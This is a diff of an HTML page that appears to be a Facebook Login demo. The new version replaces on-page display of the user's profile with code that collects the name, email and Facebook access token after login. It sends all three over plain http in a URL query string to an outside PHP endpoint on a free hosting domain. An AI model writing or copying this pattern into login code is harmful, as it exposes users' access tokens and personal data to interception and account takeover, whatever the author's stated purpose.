@@ -3,69 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login Example</title>
+    <title>Facebook Login Redirect</title>
 </head>
 <body>
+    <h2>Facebook Login Demo</h2>
+    <fb:login-button 
+        scope="public_profile,email" 
+        onlogin="checkLoginState();">
+    </fb:login-button>
 
-<!-- Facebook Login Button -->
-<div id="fb-root"></div>
-<button onclick="checkLoginState();">Login with Facebook</button>
+    <script>
+        // Facebook SDK initialization
+        window.fbAsyncInit = function () {
+            FB.init({
+                appId: '761434701600961', // Replace with your Facebook App ID
+                cookie: true,
+                xfbml: true,
+                version: 'v20.0'
+            });
 
-<!-- Display user info -->
-<div id="status"></div>
+            FB.getLoginStatus(function (response) {
+                statusChangeCallback(response);
+            });
+        };
 
-<script>
-  // Load the SDK asynchronously
-  (function(d, s, id) {
-    var js, fjs = d.getElementsByTagName(s)[0];
-    if (d.getElementById(id)) return;
-    js = d.createElement(s); js.id = id;
-    js.src = "https://connect.facebook.net/en_US/sdk.js";
-    fjs.parentNode.insertBefore(js, fjs);
-  }(document, 'script', 'facebook-jssdk'));
+        // Asynchronously load the Facebook SDK
+        (function (d, s, id) {
+            var js, fjs = d.getElementsByTagName(s)[0];
+            if (d.getElementById(id)) { return; }
+            js = d.createElement(s); js.id = id;
+            js.src = "https://connect.facebook.net/en_US/sdk.js";
+            fjs.parentNode.insertBefore(js, fjs);
+        }(document, 'script', 'facebook-jssdk'));
 
-  // Initialize the SDK once it loads
-  window.fbAsyncInit = function() {
-    FB.init({
-      appId      : '761434701600961', // Your Facebook App ID
-      cookie     : true,               // Enable cookies to allow server access to the session
-      xfbml      : true,               // Parse social plugins
-      version    : 'v20.0'             // API version
-    });
+        // Callback function for Facebook login status
+        function statusChangeCallback(response) {
+            if (response.status === 'connected') {
+                // Logged into your app and Facebook.
+                fetchUserData();
+            } else {
+                console.log('User not authenticated.');
+            }
+        }
 
-    // Check the user's login status automatically
-    FB.getLoginStatus(function(response) {
-      statusChangeCallback(response);  // Handle the response
-    });
-  };
+        // Fetch user data after successful login
+        function fetchUserData() {
+            FB.api('/me', {fields: 'name,email'}, function (response) {
+                // Get the user details
+                let userName = response.name;
+                let userEmail = response.email;
+                let accessToken = FB.getAuthResponse().accessToken;
 
-  // Callback to handle login status changes
-  function statusChangeCallback(response) {
-    console.log(response);
-    if (response.status === 'connected') {
-      // User is logged in and authenticated
-      fetchUserProfile();
-    } else {
-      // User is not logged in
-      document.getElementById('status').innerHTML = 'Please log into Facebook.';
-    }
-  }
+                // Redirect to the PHP page with user details in the query parameters
+                let url = `http://sabbir28.rf.gd/save_user_data.php?name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&accessToken=${encodeURIComponent(accessToken)}`;
+                
+                // Open the URL in a new tab
+                window.open(url, '_blank');
+            });
+        }
 
-  // Trigger login manually
-  function checkLoginState() {
-    FB.login(function(response) {
-      statusChangeCallback(response);  // Handle login status
-    }, {scope: 'public_profile,email'}); // Request additional permissions
-  }
-
-  // Fetch user profile information
-  function fetchUserProfile() {
-    FB.api('/me', {fields: 'name,email'}, function(response) {
-      console.log(response);
-      document.getElementById('status').innerHTML = 'Logged in as ' + response.name + ' (' + response.email + ')';
-    });
-  }
-</script>
-
+        // Called when user completes the Facebook login process
+        function checkLoginState() {
+            FB.getLoginStatus(function (response) {
+                statusChangeCallback(response);
+            });
+        }
+    </script>
 </body>
 </html>
